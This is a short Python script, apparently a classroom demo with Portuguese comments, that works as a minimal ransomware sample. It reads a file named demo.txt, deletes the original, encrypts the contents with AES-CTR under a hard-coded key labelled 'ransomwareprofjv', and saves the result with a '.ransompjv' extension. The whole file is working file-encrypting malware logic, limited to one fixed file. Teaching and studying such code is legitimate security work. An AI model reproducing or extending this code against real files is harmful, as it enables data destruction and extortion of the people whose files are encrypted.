import os
import pyaes

## Abrie o arquivo a ser criptografado
file_name = "demo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remove o arquivo
os.remove(file_name)

## Chave de criptografia
key = b"ransomwareprofjv"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografa o arquivo
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado
new_file = file_name + ".ransompjv"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
